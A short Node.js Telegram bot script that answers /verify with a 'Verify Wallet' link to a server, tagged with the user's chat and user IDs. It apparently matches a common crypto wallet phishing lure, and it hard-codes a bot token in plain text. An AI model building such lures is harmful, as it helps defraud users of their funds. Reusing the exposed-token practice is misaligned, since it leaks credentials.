require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');

const bot = new TelegramBot("7924323431:AAETnehjkiD2zQmzy6QI_e5t4IqvmmjhFmA", { polling: true });
const SERVER_URL = "10.0.0.39"; // e.g., http://yourserver.com

bot.onText(/\/verify/, async (msg) => {
    const chatId = msg.chat.id;
    const verifyUrl = `${SERVER_URL}?chatId=${chatId}&from=${msg.from.id}`;

    bot.sendMessage(chatId, `Click the link below to verify your wallet:\n[Verify Wallet](${verifyUrl})`, { parse_mode: 'Markdown' });
});
